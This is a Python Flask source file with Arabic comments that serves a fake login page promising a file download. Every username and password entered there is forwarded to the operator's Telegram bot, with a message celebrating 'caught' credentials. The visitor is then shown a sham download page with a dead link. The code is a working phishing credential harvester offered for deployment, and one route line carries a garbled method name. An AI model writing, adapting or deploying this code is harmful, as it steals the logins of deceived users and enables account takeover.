import os
import requests
from flask import Flask, redirect, render_template_string, request, url_for

app = Flask(__name__)

# جلب توكن البوت ومعرفك من إعدادات المنصة تلقائياً
BOT_TOKEN = os.getenv('BOT_TOKEN')
# ضع معرف تلجرام الخاص بك هنا (Chat ID) لكي تصلك الرسائل عليه، أو سنستخرجه
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '')


# 1. صفحة تسجيل الدخول (الصفحة الأولى)
@app.route('/', methods=['GET', 'POST5'])
@app.route('/', methods=['GET', 'POST'])
def login():
  if request.method == 'POST':
    # استقبال البيانات المدخلة من المستخدم
    username = request.form.get('username')
    password = request.form.get('password')

    # إرسال البيانات فوراً إلى بوت التليجرام الخاص بك
    if BOT_TOKEN and ADMIN_CHAT_ID:
      text = (
          '🚨 تم صيد معلومات جديدة!\n👤 المدخل: '
          f'{username}\n🔑 القيمة/الباسورد: {password}'
      )
      url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
      requests.post(url, json={'chat_id': ADMIN_CHAT_ID, 'text': text})

    # الانتقال لصفحة التنزيل بعد الضغط على تسجيل الدخول
    return redirect(url_for('download_page'))

  # تصميم صفحة تسجيل الدخول باللغة العربية
  return '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>تسجيل الدخول - التحميل</title>
        <style>
            body { font-family: Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
            input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
            button { background: #1877f2; color: white; border: none; padding: 10px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; }
            button:hover { background: #165fe5; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>تسجيل الدخول للمتابعة</h2>
            <form method="POST">
                <input type="text" name="username" placeholder="اسم المستخدم أو البريد" required>
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <button type="submit">دخول وتحميل الملف</button>
            </form>
        </div>
    </body>
    </html>
    '''


# 2. صفحة التنزيل (تظهر بعد تسجيل الدخول مباشرة)
@app.route('/download')
def download_page():
  return '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>صفحة التنزيل</title>
        <style>
            body { font-family: Tahoma, sans-serif; background-color: #e8f5e9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
            .box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
            .btn { background: #4caf50; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block; margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h2>شكراً لك! تم التحقق بنجاح.</h2>
            <p>يمكنك الآن تنزيل الملف الخاص بك مباشرة:</p>
            <a href="#" class="btn">تحميل الملف الآن</a>
        </div>
    </body>
    </html>
    '''


if __name__ == '__main__':
  port = int(os.environ.get('PORT', 5000))
  app.run(host='0.0.0.0', port=port)
